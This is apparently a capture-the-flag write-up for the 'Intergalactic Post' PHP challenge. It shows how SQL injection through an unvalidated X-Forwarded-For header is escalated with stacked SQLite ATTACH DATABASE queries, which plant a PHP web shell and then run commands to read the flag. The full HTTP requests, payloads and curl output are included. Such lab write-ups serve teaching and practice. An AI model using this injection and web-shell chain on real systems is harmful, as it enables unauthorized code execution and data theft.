# Intergalactic Post

**NOTE** → I do not have much of knowledge in PHP development. So kindly ignore my mistakes if any.

We are given a docker instance of a web application and its source code.

![1.png](Intergalactic%20Post%20aad61d51d82c450780cb4c1159bf140f/1.png)

Let us begin by looking at the source code.

```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$database = new Database('/tmp/challenge.db');

$router = new Router();
$router->new('GET', '/', 'IndexController@index');
$router->new('POST', '/subscribe', 'SubsController@store');

die($router->match());
```

The above is the `index.php` file. From that we can see that there are 2 routes in the application → 

- `/` → Takes a GET request that is handled by `index()` method in `controllers/IndexController.php`.
- `/subscribe` → Takes a POST request that is handled by `store()` method in `controllers/SubsController.php`.

```php
<?php
class IndexController
{
    public function index($router)
    {
        return $router->view('index');
    }
}
```

The above is the `IndexController.php` that handles request to `/`. This is simply renders the `index.php` view.

```php
<?php
class SubsController extends Controller
{
    public function __construct()
    {
        parent::__construct();
    }

    public function store($router)
    {
        $email = $_POST['email'];

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }

        $subscriber = new SubscriberModel;
        $subscriber->subscribe($email);

        header('Location: /?success=true&msg=Email subscribed successfully!');
        exit;
    }

    public function logout($router)
    {
        session_destroy();
        header('Location: /admin');
        exit;
    }
}
```

The above is the `SubsController.php` that handles request to `/subscribe`. The `store()` method expects a POST parameter `email`. Then it checks if the email provided by the user is valid or not by a PHP function called `filter_var($email, FILTER_VALIDATE_EMAIL)`. 

The function `filter_var()` returns the filtered variable, or `false` if the filter fails. You can learn more about the function from [here](https://www.php.net/manual/en/function.filter-var.php).

After validating, an object of `SubscriberModel` class is created. Then the `subscribe()` method of the class is called with the email as argument.

Finally, we are redirected to `/` with some messages in parameters as subscription is completed or failed.

```php
<?php
class SubscriberModel extends Model
{

    public function __construct()
    {
        parent::__construct();
    }

    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }

    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
    }
}
```

The above is `models/SubscriberModel.php` where `SubscriberModel` class is defined. We can see 2 methods here →

- `getSubscriberIP()` → This method checks if there are `X-Forwared-For`, `Remote-Addr`, `Http-Client-IP` headers set in the request. These headers are used to specify from which IP does that specific request is coming.
- `subscribe()` → This method first gets the output of `getSubscriberIP()` and then called a method `subscribeUser()` defined in `Database.php` that takes 2 arguments - the output of `getSubscriberIP()` and the email.

```php
<?php
class Database
{
    private static $database = null;

    public function __construct($file)
    {
        if (!file_exists($file))
        {
            file_put_contents($file, '');
        }
        $this->db = new SQLite3($file);
        $this->migrate();

        self::$database = $this;
    }

    public static function getDatabase(): Database
    {
        return self::$database;
    }

    public function migrate()
    {
        $this->db->query('
            CREATE TABLE IF NOT EXISTS `subscribers` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL
            );
        ');
    }

    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
}
```

The above is the `Database.php`. We can see that the `subscribeUser()` just executes a SQL query that adds `IP address` and `email` into the `subscribers` table. 

However, we can see that there is no defense against `SQL injection` attacks. Although, the email is being filtered by the `filter_var()` that we saw before, there is no check for the IP address. 

We can simply do a SQL injection attack using the `X-Forwarded-For` header (or any of the header we saw before).

Since the SQL statement being executed is an `INSERT` statement, therefore there is no point in using `UNION` based SQL injection attack as we do not get to see the response. In other words, we can perform a `stacked query` based SQL attack to exploit this sort of blind injections.

```bash
POST /subscribe HTTP/1.1
Host: localhost:1337
X-Forwarded-For: NehalZaman'
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://localhost:1337
Connection: close
Referer: http://localhost:1337/
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBzZWMiLCJvdHBrZXkiOnRydWUsInZlcmlmaWVkIjp0cnVlLCJpYXQiOjE2NTI5NjEwMTJ9.2fmjvHwdtFWlM0IfZ-7wF2dN-1vquKCjZCEJVDcu_Hk
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

email=nehal%40vimal.pan
```

Here I have used a `'` quote in `X-Forwarded-For` header just to check the application is vulnerable.

```bash
2022-05-19 17:58:34,059 INFO success: nginx entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2022-05-19 17:58:34,059 INFO success: fpm entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2022/05/19 18:02:01 [info] 8#8: *3 client 172.17.0.1 closed keepalive connection
2022/05/19 18:02:01 [info] 8#8: *4 client 172.17.0.1 closed keepalive connection
2022/05/19 18:44:38 [error] 8#8: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::exec(): near &quot;nehal&quot;: syntax error in /www/Database.php on line 36" while reading response header from upstream, client: 172.17.0.1, server: _, request: "POST /subscribe HTTP/1.1", upstream: "fastcgi://unix:/run/php-fpm.sock:", host: "localhost:1337", referrer: "http://localhost:1337/"
```

We can see the error message in the application console in docker that is definitely a good sign.

```bash
POST /subscribe HTTP/1.1
Host: localhost:1337
X-Forwarded-For: NehalZaman', 'nehalagain@vimal.pan') -- - 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://localhost:1337
Connection: close
Referer: http://localhost:1337/
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBzZWMiLCJvdHBrZXkiOnRydWUsInZlcmlmaWVkIjp0cnVlLCJpYXQiOjE2NTI5NjEwMTJ9.2fmjvHwdtFWlM0IfZ-7wF2dN-1vquKCjZCEJVDcu_Hk
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

email=nehal%40vimal.pan
```

This time I manipulated the `X-Forwarded-For` header in such a way that it is the same as the original query. 

```bash
022-05-19 17:58:34,059 INFO success: nginx entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2022-05-19 17:58:34,059 INFO success: fpm entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2022/05/19 18:02:01 [info] 8#8: *3 client 172.17.0.1 closed keepalive connection
2022/05/19 18:02:01 [info] 8#8: *4 client 172.17.0.1 closed keepalive connection
2022/05/19 18:44:38 [error] 8#8: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::exec(): near &quot;nehal&quot;: syntax error in /www/Database.php on line 36" while reading response header from upstream, client: 172.17.0.1, server: _, request: "POST /subscribe HTTP/1.1", upstream: "fastcgi://unix:/run/php-fpm.sock:", host: "localhost:1337", referrer: "http://localhost:1337/"
```

As a result, we do not see the error anymore. The error above is the result of the previous request.

So the blind SQL injection is confirmed here.

Now, if we look at the docker file, we can see that the flag is in a text file. Moreover, the name of the flag file has some random characters at the end.

```docker
FROM alpine:edge

# Setup usr
RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

# Install system packages
RUN apk add --no-cache --update supervisor nginx php7-fpm php7-sqlite3 php7-json

# Configure php-fpm and nginx
COPY config/fpm.conf /etc/php7/php-fpm.d/www.conf
COPY config/supervisord.conf /etc/supervisord.conf
COPY config/nginx.conf /etc/nginx/nginx.conf

# Copy challenge files
COPY challenge /www

# Copy flag
RUN RND=$(echo $RANDOM | md5sum | head -c 15) && \
	echo "HTB{f4k3_fl4g_f0r_t3st1ng}" > /flag_${RND}.txt

# Setup permissions
RUN chown -R www:www /var/lib/nginx /www

# Expose the port nginx is listening on
EXPOSE 80

CMD /usr/bin/supervisord -c /etc/supervisord.conf
```

This would mean that we are supposed to achieve RCE out of the SQL injection. 

The database being used here is SQLite. [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) shows us a way to do this.

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

We first create a database in a file that has `.php` extension. Then we create a table. Finally we insert the PHP code that we want to run, into the table. 

If we are able to put the PHP file into the website static directory, we will be able to run the PHP code.  

The static directory happen to be at `/www/static/images`. We can figure this out from the docker image.

```bash
challenge ❯ docker run -it web_intergalactic_post /bin/sh
/ # ls
bin                       home                      opt                       sbin                      usr
dev                       lib                       proc                      srv                       var
etc                       media                     root                      sys                       www
flag_1ba447f7597346d.txt  mnt                       run                       tmp
/ # cd www/
controllers/  models/       static/       views/
/ # cd www/static/images/
/www/static/images # ls
logo.png
/www/static/images #
```

Now let us tailor the payload according to our need.

```sql
NehalZaman', 'nehalagain@vimal.pan'); ATTACH DATABASE '/www/static/images/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");-- -
```

Again, we do not have any error on the docker console. 

```bash
challenge ❯ curl 'http://localhost:1337/static/images/lol.php?cmd=ls+-al+/' -o -
�� Itotal 84pwnCREATE TABLE pwn (dataz text)
drwxr-xr-x    1 root     root          4096 May 19 17:58 .
drwxr-xr-x    1 root     root          4096 May 19 17:58 ..
-rwxr-xr-x    1 root     root             0 May 19 17:58 .dockerenv
drwxr-xr-x    2 root     root          4096 Mar 28 19:19 bin
drwxr-xr-x    5 root     root           360 May 19 17:58 dev
drwxr-xr-x    1 root     root          4096 May 19 17:58 etc
-rw-r--r--    1 root     root            27 May 17 12:03 flag_1ba447f7597346d.txt
drwxr-xr-x    1 root     root          4096 May 17 12:02 home
drwxr-xr-x    1 root     root          4096 Mar 28 19:19 lib
drwxr-xr-x    5 root     root          4096 Mar 28 19:19 media
drwxr-xr-x    2 root     root          4096 Mar 28 19:19 mnt
drwxr-xr-x    2 root     root          4096 Mar 28 19:19 opt
dr-xr-xr-x  254 root     root             0 May 19 17:58 proc
drwx------    2 root     root          4096 Mar 28 19:19 root
drwxr-xr-x    1 root     root          4096 May 19 17:58 run
drwxr-xr-x    2 root     root          4096 Mar 28 19:19 sbin
drwxr-xr-x    2 root     root          4096 Mar 28 19:19 srv
dr-xr-xr-x   13 root     root             0 May 19 17:58 sys
drwxrwxrwt    1 root     root          4096 May 19 19:04 tmp
drwxr-xr-x    1 root     root          4096 May 17 12:02 usr
drwxr-xr-x    1 root     root          4096 May 17 12:02 var
drwxr-xr-x    1 www      www           4096 May 17 12:03 www
challenge ❯ curl 'http://localhost:1337/static/images/lol.php?cmd=cat+/flag_1ba447f7597346d.txt' -o -
�� IHTB{f4k3_fl4g_f0r_t3st1ng}n (dataz text)
challenge ❯
```

As you can see, we have achieved RCE here. We can do the same thing on the server to get the flag.

That is all in this challenge. Hope you liked the writeup 🙂